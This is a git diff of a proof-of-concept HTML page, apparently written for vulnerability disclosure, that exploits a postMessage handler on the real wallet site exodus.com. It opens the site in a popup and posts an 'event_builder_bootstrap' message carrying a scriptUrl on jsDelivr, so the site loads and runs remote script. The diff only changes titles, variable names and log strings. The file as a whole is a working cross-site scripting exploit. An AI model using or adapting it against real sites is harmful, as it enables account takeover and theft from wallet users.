@@ -1,30 +1,30 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>🚨 Exodus XSS via jsDelivr</title>
+  <title>🚨 Exodus XSS PoC</title>
 </head>
-<body style="background:#111; color:white; text-align:center; font-family:sans-serif; padding-top:60px;">
-  <h1>💥 Exploit exodus.com via postMessage + jsDelivr</h1>
-  <p>Click the button to inject external script into exodus.com</p>
+<body style="background:#111;color:white;font-family:sans-serif;text-align:center;padding-top:60px;">
+  <h1>💥 Exploit Exodus.com via postMessage</h1>
+  <p>Click the button to trigger <code>scriptUrl</code> XSS</p>
 
-  <button style="padding:12px 24px; font-size:18px; cursor:pointer;" onclick="launch()">🚀 Launch</button>
+  <button onclick="launch()" style="padding:10px 20px;font-size:18px;cursor:pointer;">🚀 Launch</button>
 
   <script>
     function launch() {
-      const exo = window.open("https://www.exodus.com", "_blank", "width=1000,height=800");
-      if (!exo) {
-        alert("❌ Popup blocked");
+      const win = window.open("https://www.exodus.com", "_blank", "width=1000,height=800");
+
+      if (!win) {
+        alert("❌ Popup blocked! Allow popups and try again.");
         return;
       }
 
-      // انتظر 3 ثوانٍ لتفعيل listener
       setTimeout(() => {
-        exo.postMessage({
+        win.postMessage({
           type: "event_builder_bootstrap",
           scriptUrl: "https://cdn.jsdelivr.net/gh/Baali07/XSS-PoC@main/x.js?t=" + Date.now()
         }, "https://www.exodus.com");
 
-        console.log("✅ postMessage sent with jsDelivr URL");
+        console.log("✅ Payload sent via postMessage");
       }, 3000);
     }
   </script>
